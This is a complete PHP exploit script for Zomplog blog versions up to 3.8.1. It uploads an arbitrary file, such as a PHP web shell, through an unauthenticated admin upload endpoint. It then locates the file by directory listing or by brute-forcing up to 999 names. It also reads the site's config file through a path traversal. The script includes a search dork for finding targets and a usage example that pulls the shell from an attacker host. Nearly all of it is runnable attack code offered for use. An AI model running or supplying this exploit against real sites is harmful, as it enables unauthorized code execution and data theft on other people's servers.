<?php
## Zomplog <= 3.8.1 Arbitrary File Upload Exploit
## by InATeam (http://inattack.ru/)
## tested on versions 3.8.1 with security patch, 3.8.1, 3.8, 3.7.5

echo "------------------------------------------------------------\n";
echo "Zomplog <= 3.8.1 Arbitrary File Upload Exploit\n";
echo "(c)oded by Raz0r, InATeam (http://inattack.ru/)\n";
echo "dork: \"Powered by Zomplog\"\n";
echo "------------------------------------------------------------\n";

if ($argc<3) {
echo "USAGE:\n";
echo "~~~~~~\n";
echo "php {$argv[0]} [url] [file]\n\n";
echo "[url]  - target server where Zomplog is installed\n";
echo "[file] - file to upload (local or remote)\n\n";
echo "examples:\n";
echo "php {$argv[0]} http://site.com/ http://evil-site.com/sh.php\n";
echo "php {$argv[0]} http://weblog.site.com:8080/ /root/sh.php\n";
echo "php {$argv[0]} http://site.com/zomplog/ sh.php\n";
die;
}
/**
* software site: http://zomplog.zomp.nl/
*
* i) /admin/upload_files.php is supposed to be run only from admin panel
* (it is included in /admin/editor.php, other admin scripts) but unathorized
* users can call it directly, because the script doesnt check if you are admin
* ii) /admin/upload_files.php allows to upload any files: it checks only
* MIME-types of the files but not the extensions. For example, it is possible
* to upload php script and then execute it
* iii) uploaded file will be moved to /upload directory and its name will
* have the format like this:
* [YearMonthDay]_[RandomNumberFrom1To999]_[OriginalFilename]
* In the version 3.8.1 additional prefix is used. By default /upload is not
* protected by .htaccess, so we can get the contents of it.
* However sometimes directory listing is denied and in this case we need to
* brute the filename (max number of requests is 999)
*/
error_reporting(0);
set_time_limit(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",10);
$url = $argv[1];
$file = $argv[2];
$url_parts = parse_url($url);
$host = $url_parts['host'];
$path = $url_parts['path'];
if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
$filename = basename($file);
echo "[~] Getting $filename... ";
$fp = file_get_contents($file);
$fp ? print("OK\n") : die("failed\n");
$data = "--------bndry31337\r\n";
$data.= "Content-Disposition: form-data; ";
$data.= "name=\"file\"; filename=\"{$filename}\"\r\n";
$data.= "Content-Type: text/plain\r\n\r\n";
$data.= $fp."\r\n";
$data.= "--------bndry31337\r\n";
$packet = "POST {$path}admin/upload_files.php HTTP/1.0\r\n";
$packet.= "Host: {$host}\r\n";
$packet.= "User-Agent: InAttack evil agent\r\n";
$packet.= "Content-Type: multipart/form-data; boundary=------bndry31337\r\n";
$packet.= "Content-Length: ".strlen($data)."\r\n";
$packet.= "Connection: close\r\n\r\n";
$packet.= $data;
echo "[~] Uploading {$filename}... ";
$resp = send($packet);
$exploded = explode("\r\n",$resp);
$errno=array();
preg_match('@(\d{3})@',$exploded[0],$errno);
if ($errno[1]!=200) $resp = false;
$resp ? print("OK\n") : die("failed\n");
$packet = "GET {$path}upload/ HTTP/1.0\r\n";
$packet.= "Host: {$host}\r\n";
$packet.= "User-Agent: InAttack evil agent\r\n";
$packet.= "Connection: close\r\n\r\n";
$resp = send($packet);
if (strpos($resp, "force_download.php") !== false) {
   echo "[+] Directory listing of {$path}upload/ is allowed\n";
   $matches=array();
   if (preg_match('/(temp_)*\d{8}_\d{1,3}_'.$filename.'/',$resp,$matches)){
       $newname = $matches[0];
       echo "[+] Filename is $newname\n";
       echo "[+] {$url}upload/{$newname}\n";
   }
   else die("[-] Exploit failed\n");
}
else {
   echo "[-] Directory listing of {$path}upload/ is denied\n";
   //it is necessary to determine if prefix 'temp_' is used before the filename
   echo "[~] Getting Zomplog's version... ";
   $packet = "GET {$path}upload/force_download.php?file=../admin/config.php HTTP/1.0\r\n";
   //thx to Dj7xpl for this bug =)
   $packet.= "Host: {$host}\r\n";
   $packet.= "User-Agent: InAttack evil agent\r\n";
   $packet.= "Connection: close\r\n\r\n";
   $resp = send($packet);
   $matches=array();
   if (preg_match('@\$version = "([^"]+)";@',$resp,$matches)) {
       echo $matches[1]."\n";
       $prefix = ("3.8.1" == $matches[1]) ? 'temp_' : '';
   }
   else {
       echo "3.8.1 with sec patch\n";
       $prefix = "temp_";       }
   echo "    Bruting the filename...";
   for($i=1;$i<1000;$i++) {
       $packet = "GET {$path}upload/".$prefix.date("Ymd")."_".$i."_";
       $packet.= urlencode($filename)." HTTP/1.0\r\n";
       $packet.= "Host: {$host}\r\n";
       $packet.= "User-Agent: InAttack evil agent\r\n";
       $packet.= "Connection: close\r\n\r\n";
       $resp = send($packet);
       status();
       $exploded = explode("\r\n",$resp);
       $errno=array();
       preg_match('@(\d{3})@',$exploded[0],$errno);
       if ($errno[1]==200) {
           $newname = $prefix.date("Ymd")."_".$i."_".$filename;
           echo "[+] Filename is {$newname}\n";
           echo "[+] {$url}upload/{$newname}\n";
           die;
       }
   }
   printf("[-] Exploit failed%9s\n",'');
}
function send($packet) {
   global $host,$port;
   $ock = fsockopen(gethostbyname($host),$port);
   if (!$ock) return false;
   else {
       fputs($ock, $packet);
       $html='';
       while (!feof($ock)) $html.=fgets($ock);
   }
   return $html;
}
function status() {
   static $n;
   $n++;
   if ($n > 3) $n = 0;
   if($n==0){ print "\r[-]\r";  }
   if($n==1){ print "\r[\\]\r";  }
   if($n==2){ print "\r[|]\r";  }
   if($n==3){ print "\r[/]\r"; }
}
?>
